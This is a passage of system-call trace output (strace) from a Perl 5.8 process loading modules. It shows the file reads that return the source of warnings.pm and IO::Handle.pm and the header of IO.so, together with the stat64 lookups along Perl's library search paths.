\"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
19001 12:57:07.382129 brk(0x81b6000)    = 0x81b6000
19001 12:57:07.382147 brk(0x81b5000)    = 0x81b5000
19001 12:57:07.382227 read(9, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
19001 12:57:07.382723 read(9, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
19001 12:57:07.383405 read(9, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
19001 12:57:07.383539 read(9, "", 4096) = 0
19001 12:57:07.383553 close(9)          = 0
19001 12:57:07.383719 _llseek(7, 412, [412], SEEK_SET) = 0
19001 12:57:07.383735 _llseek(7, 0, [412], SEEK_CUR) = 0
19001 12:57:07.383746 close(7)          = 0
19001 12:57:07.383788 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
19001 12:57:07.383812 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
19001 12:57:07.383841 futex(0xb7ede070, 0x81 /* FUTEX_??? */, 2147483647) = 0
19001 12:57:07.383858 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 7
19001 12:57:07.383873 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
19001 12:57:07.383963 fstat64(7, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
19001 12:57:07.383988 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7ee2000
19001 12:57:07.384002 mmap2(0xb7ee6000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x3) = 0xb7ee6000
19001 12:57:07.384021 close(7)          = 0
19001 12:57:07.384206 stat64("/etc/perl/IO/Handle.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384224 stat64("/etc/perl/IO/Handle.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384238 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384251 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384265 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384278 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384293 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384305 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384318 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384331 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf8e3d4c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384344 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf8e3e3c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384357 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
19001 12:57:07.384379 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 7
19001 12:57:07.384394 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8e3b58) = -1 ENOTTY (Inappropriate ioctl for device)
19001 12:57:07.384406 _llseek(7, 0, [0], SEEK_CUR) = 0
19001 12:57:07.384423 read(7, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
19001 12:57:07.384829 stat64("/etc/perl/Symbol.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384846 stat64("/etc/perl/Symbol.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384859 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf8e398c) = -1 ENOENT (No such file or directory)
19001 12:57:07.384872 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf8e389c) = -1 ENOENT (No such file or directory)
